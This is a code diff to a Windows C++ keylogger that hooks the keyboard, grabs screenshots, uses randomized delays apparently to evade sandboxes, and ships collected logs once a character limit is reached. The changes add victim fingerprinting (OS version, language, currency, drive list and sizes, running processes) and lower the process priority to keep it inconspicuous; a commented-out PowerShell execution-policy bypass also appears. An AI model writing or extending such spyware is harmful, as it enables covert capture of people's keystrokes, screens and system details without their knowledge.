@@ -9,8 +9,8 @@
 #pragma warning( push )
 #pragma warning( disable : 4477 )
 
-typedef LONG(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
-PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDelayExecution");
+//typedef LONG(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
+//PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDelayExecution");
 
 
 HHOOK keyboardHook;
@@ -25,6 +25,8 @@ int main()
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
         exit(0);
     }
+
+    SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
 
     DWORD Tick1 = GetTickCount();
 
@@ -47,7 +49,7 @@ int main()
         int Divider = rand() % 10000 + 100, DividedSleep = (DelayTime + rand()%1000+10) / Divider;
         LARGE_INTEGER delay;
         delay.QuadPart = -10000 * (DividedSleep * 1000);
-        pNtDelayExecution(FALSE, &delay);
+        //pNtDelayExecution(FALSE, &delay);
         for (int j = 0; j <= Divider; j++) {
             Sleep(DividedSleep);
         }
@@ -59,9 +61,10 @@ int main()
     }
 
     bool FirstLog = true;
-
-    unsigned long ThreadId2;
-    CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);
+    if (ScreenGrab) {
+        unsigned long ThreadId2;
+        CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);
+    }
 
     //ShellExecuteA(0, "open", "cmd.exe", "/C powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass", 0, SW_HIDE);
 
@@ -139,6 +142,7 @@ Log:
     std::string SeedText = "Randomness Seed:";
     std::string CopiedFileText = "Made executable \"";
     std::string CryptText = "Encrypted with ";
+    std::string DiskText = "Found partitions:\n";
 
     VersionText += CurrentVersion;
     if (IsMajor)
@@ -311,7 +315,13 @@ Log:
     std::string Monitors = std::to_string(mo);
     std::string MouseButtons = std::to_string(mb);
     std::string BootMode = "Yes";
-
+    PBYTE WKSTAPointer;
+    WKSTA_INFO_100 WKSTABuf;
+    NetWkstaGetInfo(NULL, 100, &WKSTAPointer);
+    memcpy(&WKSTABuf, WKSTAPointer, sizeof(WKSTABuf));
+    WindowsVersion = WKSTABuf.wki100_ver_major;
+    WindowsVersion += ".";
+    WindowsVersion += WKSTABuf.wki100_ver_minor;
     if (GetSystemMetrics(SM_CLEANBOOT) != 0) {
         BootMode = "No";
     }
@@ -374,15 +384,10 @@ Log:
         }
     }
 
-    char Locale[LOCALE_NAME_MAX_LENGTH+1];
-
-    GetCurrencyFormatA(
-        LOCALE_SYSTEM_DEFAULT, 
-        LOCALE_NOUSEROVERRIDE,
-        "0",
-        NULL,
-        Locale,
-        LOCALE_NAME_MAX_LENGTH);
+    char LanguageIdentifier[100];
+    char CurrIdentifier[100];
+    GetLocaleInfo(GetSystemDefaultUILanguage(), LOCALE_SENGLANGUAGE, LanguageIdentifier, sizeof(LanguageIdentifier));
+    GetLocaleInfo(GetSystemDefaultUILanguage(), LOCALE_SENGCURRNAME, CurrIdentifier, sizeof(CurrIdentifier));
 
     TimeText += LogTime;
     log.LogItChar(TimeText);
@@ -439,10 +444,10 @@ Log:
     SlowText += SlowMachine;
     log.LogItChar(SlowText);
 
-    LanguageText += GetSystemDefaultUILanguage();
+    LanguageText += LanguageIdentifier;
     log.LogItChar(LanguageText);
 
-    CurrencyText += Locale;
+    CurrencyText += CurrIdentifier;
     log.LogItChar(CurrencyText);
 
     MiddleEastText += MiddleEast;
@@ -452,17 +457,54 @@ Log:
     log.LogItChar(SeedText);
 
 
-    log.LogItChar("_____________________________________________\n");
+    for (int i = (int)'A'; i < (int)'Z'; i++) {
+        std::string DriveLetter = {};
+        DriveLetter += (char)i;
+        DriveLetter += ":\\";
+        ULARGE_INTEGER DiskSize;
+        UINT DriveType = GetDriveTypeA(DriveLetter.c_str());
+        //MessageBoxA(NULL,std::to_string(DriveType).c_str(), DriveLetter.c_str(),MB_OK);
+        if ( DriveType != DRIVE_UNKNOWN && DriveType != DRIVE_NO_ROOT_DIR) {
+            if (GetDiskFreeSpaceExA(DriveLetter.c_str(), NULL, &DiskSize, NULL) || (DriveType != DRIVE_CDROM && DriveType != DRIVE_REMOVABLE)) {
+                DiskText += (char)i;
+                DiskText += ":\\  Type:";
+                DiskText += std::to_string(DriveType);
+                DiskText += "  Size:";
+                DiskText += std::to_string((DiskSize.QuadPart / 1073741824));
+                DiskText += "GB,\n";
+                DiskSize.QuadPart = 0;
+            }
+        }
+    }
+    DiskText.erase(DiskText.size()-2);
+    DiskText += "\n";
+    log.LogItChar(DiskText);
 
+    log.LogItChar("_____________________________________________\nList of running processes: \n");
 
+    HANDLE hpSnap;
+    PROCESSENTRY32 pentry;
+    hpSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hpSnap != INVALID_HANDLE_VALUE) {
+        pentry.dwSize = sizeof(PROCESSENTRY32);
+    }
+    else {
+        return false;
+    }
 
+    if (!Process32First(hpSnap, &pentry)) {
+        CloseHandle(hpSnap);
+        return false;
+    }
 
+    do {
+        log.LogItChar(pentry.szExeFile);
+    } while (Process32Next(hpSnap, &pentry));
+
+    log.LogItChar("\n_____________________________________________\n");
 
     int ArraySize = 10;
-
      int KeyList = {};
-
-
      for (int k = 0; k < CharactersPerLog;) {
          Sleep(25);
          for (int i = 8; i < 190; i++) {
@@ -479,7 +521,7 @@ Log:
      FileSubmit(CurrentLog.c_str(),RemoteFile.c_str());
      */
 
-     log.LogItChar("\n_____________________________________________");
+     log.LogItChar("\n_____________________________________________\n");
      log.LogItChar("Character limit hit, sending log...");
 
      log.SendLog();
